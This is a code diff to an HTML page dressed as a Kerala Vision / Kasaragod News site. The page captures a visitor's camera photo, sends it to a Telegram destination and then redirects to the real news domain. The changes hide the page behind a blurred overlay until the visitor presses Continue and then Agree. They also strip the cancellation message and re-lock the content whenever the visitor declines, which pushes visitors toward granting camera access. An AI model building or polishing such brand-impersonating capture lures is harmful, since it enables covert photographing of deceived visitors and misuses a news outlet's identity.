@@ -36,14 +36,30 @@
       border: none;
     }
 
+    .page-background {
+      min-height: 100vh;
+      transition: filter 0.25s ease, transform 0.25s ease;
+    }
+
+    .page-background.is-blurred {
+      filter: blur(5px);
+      transform: scale(1.015);
+    }
+
     .fallback {
       padding: 12px;
       text-align: center;
     }
 
-    .controls {
-      text-align: center;
-      padding: 20px;
+    .entry-screen {
+      position: fixed;
+      inset: 0;
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      background: rgba(0, 0, 0, 0.24);
     }
 
     #continueButton {
@@ -52,7 +68,7 @@
       border: none;
       border-radius: 6px;
       padding: 10px 24px;
-      font-size: 14px;
+      font-size: 16px;
       font-weight: 600;
       cursor: pointer;
       transition: background 0.2s ease;
@@ -69,10 +85,20 @@
     }
 
     #status {
-      margin: 15px auto 0;
+      position: fixed;
+      left: 50%;
+      bottom: 20px;
+      transform: translateX(-50%);
+      z-index: 1200;
+      width: min(500px, calc(100% - 32px));
+      margin: 0;
+      padding: 12px 16px;
       font-size: 14px;
       line-height: 1.4;
-      max-width: 500px;
+      text-align: center;
+      background: #fff;
+      border-radius: 6px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.16);
     }
 
     .modal-backdrop {
@@ -80,7 +106,7 @@
       inset: 0;
       background: rgba(0, 0, 0, 0.55);
       backdrop-filter: blur(2px);
-      z-index: 1000;
+      z-index: 1100;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -171,6 +197,7 @@
 </head>
 
 <body>
+  <div id="pageBackground" class="page-background is-blurred">
   <header>
     <h2>Kerala Vision</h2>
     <span>Kasaragod News</span>
@@ -191,20 +218,20 @@
     </a>
   </div>
 
-  <div class="controls">
-    <div id="initialControls">
-      <button id="continueButton">Continue</button>
-    </div>
-    <p id="status" role="status" aria-live="polite"></p>
   </div>
+
+  <div id="entryScreen" class="entry-screen">
+    <button id="continueButton">Continue</button>
+  </div>
+  <p id="status" role="status" aria-live="polite" style="display: none;"></p>
 
   <div id="consentModal" class="modal-backdrop" style="display: none;">
     <div class="modal-dialog" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
       <h3 id="modalTitle" class="modal-title">Camera and photo consent</h3>
-      <p class="modal-message">Clicking Continue will request access to your camera. If you grant access, this page will automatically capture one photo and send it to the Telegram destination configured for this demonstration. If you cancel or deny camera access, no photo will be captured or sent.</p>
+      <p class="modal-message">Selecting Agree will request access to your camera. If you grant access, this page will automatically capture one photo and send it to the Telegram destination configured for this demonstration. If you cancel or deny camera access, no photo will be captured or sent.</p>
       <div class="modal-actions">
         <button type="button" id="modalCancelBtn" class="modal-btn modal-btn-cancel">Cancel</button>
-        <button type="button" id="modalContinueBtn" class="modal-btn modal-btn-continue">Continue</button>
+        <button type="button" id="modalContinueBtn" class="modal-btn modal-btn-continue">Agree</button>
       </div>
     </div>
   </div>
@@ -229,7 +256,8 @@
     const modal = document.getElementById("consentModal");
     const modalCancelBtn = document.getElementById("modalCancelBtn");
     const modalContinueBtn = document.getElementById("modalContinueBtn");
-    const initialControls = document.getElementById("initialControls");
+    const entryScreen = document.getElementById("entryScreen");
+    const pageBackground = document.getElementById("pageBackground");
 
     let activeSessionId = null;
     let activeStream = null;
@@ -257,17 +285,20 @@
       const sessionId = getSessionId();
       if (!sessionId) {
         status.style.color = "#c62828";
+        status.style.display = "block";
         status.textContent = "Missing session ID. Please open this page using a valid demonstration link (e.g., demo.html?session=<id>).";
         return;
       }
 
       if (!navigator.mediaDevices?.getUserMedia) {
         status.style.color = "#c62828";
+        status.style.display = "block";
         status.textContent = "Camera access is not supported by this browser.";
         return;
       }
 
       status.style.color = "#444";
+      status.style.display = "block";
       status.textContent = "Verifying demonstration session...";
       continueButton.disabled = true;
 
@@ -298,20 +329,27 @@
         }
 
         activeSessionId = sessionId;
+        pageBackground.classList.remove("is-blurred");
+        entryScreen.style.display = "none";
+        status.style.display = "none";
         status.textContent = "";
         modal.style.display = "flex";
       } catch (err) {
         continueButton.disabled = false;
         status.style.color = "#c62828";
+        status.style.display = "block";
         status.textContent = err.message;
       }
     });
 
     function closeModal() {
       modal.style.display = "none";
+      pageBackground.classList.add("is-blurred");
+      entryScreen.style.display = "flex";
       continueButton.disabled = false;
-      status.style.color = "#666";
-      status.textContent = "Demonstration cancelled. No photo was captured or sent.";
+      activeSessionId = null;
+      status.style.display = "none";
+      status.textContent = "";
     }
 
     modalCancelBtn.addEventListener("click", closeModal);
@@ -328,8 +366,10 @@
       flowStarted = true;
       modalContinueBtn.disabled = true;
       modal.style.display = "none";
-      initialControls.style.display = "none";
+      entryScreen.style.display = "none";
+      pageBackground.classList.remove("is-blurred");
       status.style.color = "#444";
+      status.style.display = "block";
       status.textContent = "Requesting camera access...";
 
       try {
@@ -348,6 +388,7 @@
       } catch (error) {
         stopCamera();
         status.style.color = "#c62828";
+        status.style.display = "block";
         status.textContent = (error.name === "NotAllowedError" || error.name === "AbortError")
           ? "Camera access was cancelled or denied. No photo was captured or sent."
           : error.message;
@@ -358,7 +399,8 @@
           activeSessionId = null;
           modalContinueBtn.disabled = false;
           continueButton.disabled = false;
-          initialControls.style.display = "block";
+          pageBackground.classList.add("is-blurred");
+          entryScreen.style.display = "flex";
         }
       }
     });
@@ -438,6 +480,8 @@
         throw new Error(errorDetail);
       }
 
+      status.style.display = "none";
+      status.textContent = "";
       window.location.assign("https://www.keralavisionnews.com/");
     }
   </script>
